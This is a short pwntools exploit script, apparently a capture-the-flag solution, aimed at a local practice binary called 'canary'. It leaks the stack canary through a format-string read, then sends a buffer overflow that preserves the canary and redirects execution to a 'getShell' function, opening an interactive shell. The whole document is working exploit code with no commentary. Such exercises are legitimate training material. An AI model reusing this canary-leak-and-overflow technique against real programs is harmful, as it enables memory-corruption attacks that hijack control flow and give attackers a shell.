from pwn import *

p = process("./canary")
elf = ELF("./canary")

p.recv()
payload = b"%23$p"
p.sendline(payload)
canary = int(p.recvuntil("00"), 16)
junk = b'a'*120
payload = junk + p64(canary) + b'a'*8 + p64(elf.symbols['getShell']+1)
p.sendline(payload)

p.interactive()
